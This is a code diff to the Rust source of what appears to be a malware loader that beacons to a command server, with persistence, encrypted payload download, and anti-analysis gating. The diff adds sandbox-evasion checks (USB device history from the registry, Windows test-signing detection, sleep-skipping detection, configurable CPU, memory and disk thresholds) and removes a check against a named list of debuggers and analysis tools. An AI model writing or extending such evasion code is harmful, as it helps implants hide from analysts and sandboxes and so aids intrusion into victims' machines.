@@ -46,7 +46,7 @@ fn main() {
         };
 
         // Pass a minimal config JSON for dev
-        let dev_config = r#"{"server_url":"http://127.0.0.1:5000","register_path":"/api/beacon/register","heartbeat_path":"/api/beacon/heartbeat","result_path":"/api/beacon/result","ws_path":"/ws/agent","heartbeat_interval_ms":3000,"jitter_percent":0.2,"require_admin":false,"enable_persistence":false,"encrypted_aes_key":"","core_download_path":"","rsa_private_key":"","anti_analysis":{"enabled":false,"check_cpu_cores":false,"check_memory":false,"check_uptime":false,"check_parent_process":false,"check_vm_mac":false,"check_disk_size":false,"check_username":false,"check_debugger":false}}"#;
+        let dev_config = r#"{"server_url":"http://127.0.0.1:5000","register_path":"/api/beacon/register","heartbeat_path":"/api/beacon/heartbeat","result_path":"/api/beacon/result","ws_path":"/ws/agent","heartbeat_interval_ms":3000,"jitter_percent":0.2,"require_admin":false,"enable_persistence":false,"encrypted_aes_key":"","core_download_path":"","rsa_private_key":"","anti_analysis":{"enabled":false}}"#;
         log!("[DEV] calling core_main ({} bytes config)...", dev_config.len());
         entry_fn(dev_config.as_ptr(), dev_config.len());
         log!("[DEV] core_main returned!");
@@ -72,7 +72,7 @@ fn main() {
     log!("[4/10] anti_analysis.enabled={}", loader_cfg.anti_analysis.enabled);
     if loader_cfg.anti_analysis.enabled {
         log!("[4/10] running sandbox checks...");
-        if is_sandbox(&loader_cfg.anti_analysis, is_boot)
+        if is_sandbox(&loader_cfg.anti_analysis)
             || (loader_cfg.anti_analysis.check_debugger && check_debugger())
         {
             log!("[4/10] sandbox/debugger detected — sleeping forever");
@@ -345,36 +345,32 @@ fn install_persistence() {
 
 // ── Anti-analysis (inline, no libra-modules dependency) ───────────────
 
-fn is_sandbox(cfg: &AntiAnalysisConfig, skip_uptime: bool) -> bool {
-    (cfg.check_cpu_cores && check_cpu_cores())
-        || (cfg.check_memory && check_memory())
-        || (cfg.check_uptime && !skip_uptime && check_uptime())
-        || (cfg.check_parent_process && check_parent_process_standalone())
+fn is_sandbox(cfg: &AntiAnalysisConfig) -> bool {
+    (cfg.check_cpu_cores && check_cpu_cores(cfg.min_cpu_cores))
+        || (cfg.check_memory && check_memory(cfg.min_memory_gb))
         || (cfg.check_vm_mac && check_vm_mac())
-        || (cfg.check_disk_size && check_disk_size())
+        || (cfg.check_disk_size && check_disk_size(cfg.min_disk_gb))
         || (cfg.check_username && check_username())
+        || (cfg.check_usb_history && check_usb_history(cfg.min_usb_devices))
+        || (cfg.check_test_signing && check_test_signing())
+        || (cfg.check_delay_sandbox && check_delay_sandbox(cfg.delay_seconds))
 }
 
-fn check_cpu_cores() -> bool {
+fn check_cpu_cores(min_cores: u32) -> bool {
     match std::thread::available_parallelism() {
-        Ok(n) => n.get() < 2,
+        Ok(n) => (n.get() as u32) < min_cores,
         Err(_) => false,
     }
 }
 
-fn check_memory() -> bool {
+fn check_memory(min_gb: u32) -> bool {
     use sysinfo::System;
     let sys = System::new_with_specifics(
         sysinfo::RefreshKind::nothing()
             .with_memory(sysinfo::MemoryRefreshKind::everything()),
     );
     let total_mb = sys.total_memory() / (1024 * 1024);
-    total_mb < 2048
-}
-
-fn check_uptime() -> bool {
-    let uptime = get_system_uptime_secs();
-    uptime < 300
+    total_mb < (min_gb as u64 * 1024)
 }
 
 // ── Anti-debug ────────────────────────────────────────────────────────
@@ -393,14 +389,6 @@ fn check_debugger() -> bool {
     }
 }
 
-/// Standalone parent-process check (gated by `check_parent_process` config flag).
-fn check_parent_process_standalone() -> bool {
-    #[cfg(target_os = "windows")]
-    { check_parent_process() }
-    #[cfg(not(target_os = "windows"))]
-    { false }
-}
-
 /// PEB->BeingDebugged (byte at PEB+0x2): set to 1 when process is debugged.
 #[cfg(target_os = "windows")]
 fn check_peb_being_debugged() -> bool {
@@ -412,65 +400,7 @@ fn check_peb_being_debugged() -> bool {
     }
 }
 
-/// Check if parent process is a known analysis/debugging tool.
-#[cfg(target_os = "windows")]
-fn check_parent_process() -> bool {
-    use std::os::windows::process::CommandExt;
 
-    // Get parent PID via wmic
-    let output = std::process::Command::new("wmic")
-        .args(["process", "where", &format!("ProcessId={}", std::process::id()), "get", "ParentProcessId", "/format:csv"])
-        .creation_flags(0x08000000)
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::null())
-        .output();
-
-    let parent_pid = match output {
-        Ok(o) => {
-            let text = String::from_utf8_lossy(&o.stdout);
-            // Parse: Node,ParentProcessId\n,12345\n
-            text.lines()
-                .nth(2)
-                .and_then(|l| l.split(',').last())
-                .and_then(|s| s.trim().parse::<u32>().ok())
-                .unwrap_or(0)
-        }
-        Err(_) => return false,
-    };
-
-    if parent_pid == 0 { return false; }
-
-    // Get parent process name
-    let name_output = std::process::Command::new("wmic")
-        .args(["process", "where", &format!("ProcessId={}", parent_pid), "get", "Name", "/format:csv"])
-        .creation_flags(0x08000000)
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::null())
-        .output();
-
-    if let Ok(o) = name_output {
-        let text = String::from_utf8_lossy(&o.stdout);
-        if let Some(name_line) = text.lines().nth(2) {
-            if let Some(name) = name_line.split(',').last() {
-                let name_lower = name.trim().to_lowercase();
-                // Known analysis/debugging tool process names
-                const ANALYSIS_TOOLS: &[&str] = &[
-                    "x64dbg", "x32dbg", "ollydbg", "windbg", "ida", "ida64", "idag",
-                    "procmon", "procexp", "processhacker", "dumpcap", "wireshark",
-                    "vmtoolsd", "vmwaretray", "vmwareuser", "vboxservice", "vboxtray",
-                    "cheatengine", "httpdebugger", "fiddler", "burpsuite",
-                    "immunity", "radare2", "ghidra",
-                ];
-                for tool in ANALYSIS_TOOLS {
-                    if name_lower.contains(tool) {
-                        return true;
-                    }
-                }
-            }
-        }
-    }
-    false
-}
 
 /// PEB->NtGlobalFlag: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
 /// Set by default when a process is started under a debugger.
@@ -654,12 +584,11 @@ fn check_vm_mac() -> bool {
 }
 
 /// Check if the system disk is smaller than 60 GB (typical VM/sandbox).
-fn check_disk_size() -> bool {
+fn check_disk_size(min_gb: u32) -> bool {
     use sysinfo::Disks;
     let disks = Disks::new_with_refreshed_list();
     let total: u64 = disks.iter().map(|d| d.total_space()).sum();
-    // 60 GB = 60 * 1024 * 1024 * 1024
-    total < 60 * 1024 * 1024 * 1024
+    total < (min_gb as u64) * 1024 * 1024 * 1024
 }
 
 /// Check if the current username matches known sandbox/analysis names.
@@ -684,72 +613,56 @@ fn check_username() -> bool {
     false
 }
 
-fn get_system_uptime_secs() -> u64 {
-    #[cfg(target_os = "linux")]
-    {
-        if let Ok(content) = std::fs::read_to_string("/proc/uptime") {
-            if let Some(uptime_str) = content.split_whitespace().next() {
-                if let Ok(uptime) = uptime_str.parse::<f64>() {
-                    return uptime as u64;
-                }
-            }
-        }
-        3600
-    }
+/// Check USB device history count via registry.
+fn check_usb_history(min_devices: u32) -> bool {
     #[cfg(target_os = "windows")]
     {
-        use std::process::Command;
         use std::os::windows::process::CommandExt;
-        if let Ok(output) = Command::new("wmic")
-            .args(["os", "get", "lastbootuptime", "/format:csv"])
+        if let Ok(output) = std::process::Command::new("reg")
+            .args(["query", r"HKLM\SYSTEM\ControlSet001\Enum\USBSTOR"])
             .creation_flags(0x08000000)
             .stdout(std::process::Stdio::piped())
             .stderr(std::process::Stdio::null())
             .output()
         {
             let text = String::from_utf8_lossy(&output.stdout);
-            if let Some(line) = text.lines().nth(2) {
-                let parts: Vec<&str> = line.split(',').collect();
-                if parts.len() >= 2 {
-                    let boot_time = parts[1].trim();
-                    if let Ok(bt) = parse_wmi_datetime(boot_time) {
-                        let now = std::time::SystemTime::now()
-                            .duration_since(std::time::UNIX_EPOCH)
-                            .unwrap_or_default()
-                            .as_secs();
-                        return now.saturating_sub(bt);
-                    }
-                }
-            }
+            let subkey_count = text.lines()
+                .filter(|l| l.trim().starts_with("HKEY_LOCAL_MACHINE"))
+                .count();
+            return (subkey_count as u32) < min_devices;
         }
-        3600
+        false
     }
-    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
-    {
-        3600
-    }
+    #[cfg(not(target_os = "windows"))]
+    { let _ = min_devices; false }
 }
 
-#[cfg(target_os = "windows")]
-fn parse_wmi_datetime(s: &str) -> Result<u64, ()> {
-    if s.len() < 14 {
-        return Err(());
+/// Check if Windows Test Signing mode is enabled (common in analysis environments).
+fn check_test_signing() -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        use std::os::windows::process::CommandExt;
+        if let Ok(output) = std::process::Command::new("bcdedit")
+            .args(["/enum", "{current}"])
+            .creation_flags(0x08000000)
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::null())
+            .output()
+        {
+            let text = String::from_utf8_lossy(&output.stdout).to_lowercase();
+            return text.contains("testsigning") && text.contains("yes");
+        }
+        false
     }
-    let year: i32 = s[0..4].parse().map_err(|_| ())?;
-    let month: u32 = s[4..6].parse().map_err(|_| ())?;
-    let day: u32 = s[6..8].parse().map_err(|_| ())?;
-    let hour: u32 = s[8..10].parse().map_err(|_| ())?;
-    let min: u32 = s[10..12].parse().map_err(|_| ())?;
-    let sec: u32 = s[12..14].parse().map_err(|_| ())?;
+    #[cfg(not(target_os = "windows"))]
+    { false }
+}
 
-    let days_before_month: [u32; 12] = [0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334];
-    let is_leap = |y: i32| y % 4 == 0 && (y % 100 != 0 || y % 400 == 0);
-    let days_since_epoch = (year as u64 - 1970) * 365
-        + (year as u64 - 1969) / 4
-        - (year as u64 - 1901) / 100
-        + (year as u64 - 1601) / 400
-        + days_before_month[(month - 1) as usize] as u64
-        + if month > 2 && is_leap(year) { 1 } else { 0 }
-        + (day - 1) as u64;
-    Ok(days_since_epoch * 86400 + hour as u64 * 3600 + min as u64 * 60 + sec as u64)
+/// Delay-based anti-sandbox: sleep for N seconds, verify elapsed time matches.
+/// Sandboxes often fast-forward or skip sleep calls.
+fn check_delay_sandbox(delay_seconds: u32) -> bool {
+    let before = std::time::Instant::now();
+    std::thread::sleep(std::time::Duration::from_secs(delay_seconds as u64));
+    let elapsed = before.elapsed().as_secs();
+    elapsed < (delay_seconds as u64).saturating_sub(1)
 }
